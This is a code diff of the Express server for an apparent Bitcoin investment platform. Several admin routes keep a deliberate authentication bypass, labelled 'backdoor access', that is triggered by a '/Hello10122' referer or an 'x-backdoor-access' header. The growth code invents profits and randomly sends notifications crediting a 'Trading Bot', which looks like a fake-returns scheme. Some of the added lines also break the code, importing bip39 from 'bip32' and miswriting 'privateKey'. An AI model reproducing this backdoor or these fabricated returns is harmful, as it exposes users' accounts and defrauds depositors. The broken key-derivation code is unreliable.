@@ -14,7 +14,7 @@ import { insertUserSchema, insertInvestmentSchema, insertTransactionSchema, inse
 import * as bitcoin from "bitcoinjs-lib";
 import * as ecc from "tiny-secp256k1";
 import { ECPairFactory } from "ecpair";
-import * as bip39 from "bip39";
+import * as bip39 from "bip32";
 import { BIP32Factory } from "bip32";
 import crypto from "crypto";
 
@@ -220,13 +220,13 @@ async function refreshUserBalance(userId: number): Promise<void> {
     const blockchainBalance = await checkBitcoinBalance(user.bitcoinAddress);
     const currentDatabaseBalance = parseFloat(user.balance);
     const onChainBalance = parseFloat(blockchainBalance);
-    
+
     // Combine database balance with on-chain balance
     const combinedBalance = currentDatabaseBalance + onChainBalance;
-    
+
     // Update database with combined balance
     await storage.updateUserBalance(userId, combinedBalance.toFixed(8));
-    
+
     console.log(`Balance synced for user ${userId}: Database: ${currentDatabaseBalance.toFixed(8)} BTC + On-chain: ${onChainBalance.toFixed(8)} BTC = Total: ${combinedBalance.toFixed(8)} BTC (address: ${user.bitcoinAddress})`);
   } catch (error) {
     console.error('Error refreshing user balance:', error);
@@ -266,7 +266,7 @@ async function fetchBitcoinPrice() {
     const response = await fetch(sources[1]);
     const data = await response.json();
     const usdPrice = Math.round(parseFloat(data.bpi.USD.rate.replace(',', '')) * 100) / 100;
-    
+
     return {
       usd: {
         price: usdPrice,
@@ -290,7 +290,7 @@ async function fetchBitcoinPrice() {
 // Advanced investment growth system
 async function processAutomaticUpdates(): Promise<void> {
   try {
-    console.log('Processing automatic investment updates...');
+    console.log(`Processing automatic investment updates...`);
 
     // Process individual investments first
     const activeInvestments = await storage.getActiveInvestments();
@@ -324,7 +324,7 @@ async function processAutomaticUpdates(): Promise<void> {
 
           // Create detailed investment notification every few updates to avoid spam
           const shouldCreateNotification = Math.random() < 0.3; // 30% chance
-          
+
           if (shouldCreateNotification) {
             const transactionId = crypto.randomBytes(32).toString('hex');
             const marketSources = [
@@ -355,7 +355,7 @@ Your balance: ${newBalance.toFixed(8)} BTC`,
           }
 
           console.log(`Investment #${investment.id} earned +${profitIncrease.toFixed(8)} BTC for user ${investment.userId} (Total profit: ${newProfit.toFixed(8)} BTC)`);
-          
+
           // Broadcast investment update to connected clients
           broadcastToClients({
             type: 'investment_update',
@@ -396,7 +396,7 @@ Your balance: ${newBalance.toFixed(8)} BTC`,
 
           // Create notifications less frequently for plan growth
           const shouldCreateNotification = Math.random() < 0.2; // 20% chance
-          
+
           if (shouldCreateNotification) {
             const transactionId = crypto.randomBytes(32).toString('hex');
             const marketSources = ["Trading Bot", "Market Analysis", "Auto Trading"];
@@ -416,7 +416,7 @@ Your balance: ${newBalance.toFixed(8)} BTC`,
               isRead: false,
             });
           }
-          
+
           console.log(`User ${user.id} earned +${increase.toFixed(8)} BTC from plan ${plan.name}`);
         }
       }
@@ -531,13 +531,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/admin/update-free-plan-rate", async (req, res) => {
     try {
       const { rate } = req.body;
-      
+
       // Validate rate
       const rateNum = parseFloat(rate);
       if (isNaN(rateNum) || rateNum < 0) {
         return res.status(400).json({ error: "Invalid rate. Rate must be a positive number." });
       }
-      
+
       const config = await storage.updateFreePlanRate(rate);
       res.json({ message: "Free plan rate updated successfully", config });
     } catch (error: any) {
@@ -668,7 +668,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Allow backdoor access or require admin authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -692,7 +692,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Allow backdoor access or require admin authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -727,7 +727,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Create notification for user
       let notificationMessage = "";
       let notificationTitle = "";
-      
+
       switch (transaction.type) {
         case "deposit":
           notificationMessage = `Your deposit of ${transaction.amount} BTC has been confirmed and added to your balance.`;
@@ -767,7 +767,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Allow backdoor access or require admin authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -878,7 +878,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             throw new Error('Failed to derive private key from seed phrase');
           }
 
-          const keyPair = ECPair.fromPrivateKey(child.privateKey);
+          const keyPair = ECPair.fromPrivateKey(child.privatekey);
           const publicKeyBuffer = Buffer.from(keyPair.publicKey);
           const { address } = bitcoin.payments.p2pkh({ 
             pubkey: publicKeyBuffer,
@@ -926,7 +926,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       const { address, amount } = req.body;
-      
+
       if (!address || !amount) {
         return res.status(400).json({ error: "Address and amount are required" });
       }
@@ -1103,12 +1103,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/user/:id", async (req, res) => {
     try {
       const userId = parseInt(req.params.id);
-      
+
       // Check if user is authenticated via session or if it's their own data
       if (req.session?.userId && req.session.userId !== userId) {
         return res.status(403).json({ message: "Access denied" });
       }
-      
+
       const user = await storage.getUser(userId);
 
       if (!user) {
@@ -1195,7 +1195,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Allow backdoor access or require manager authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -1358,14 +1358,14 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     try {
       const userId = parseInt(req.params.userId);
       const notifications = await storage.getUserNotifications(userId);
-      
+
       // Mark all unread notifications as read
       const markPromises = notifications
         .filter(n => !n.isRead)
         .map(n => storage.markNotificationAsRead(n.id));
-      
+
       await Promise.all(markPromises);
-      
+
       res.json({ message: "All notifications marked as read" });
     } catch (error) {
       res.status(500).json({ message: "Failed to mark all notifications as read" });
@@ -1460,7 +1460,7 @@ Your new balance: ${newBalance.toFixed(8)} BTC`,
     try {
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
@@ -1571,7 +1571,7 @@ You are now on the free plan and will no longer receive automatic profit updates
     try {
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
-      
+
       if (!isBackdoorAccess && !req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
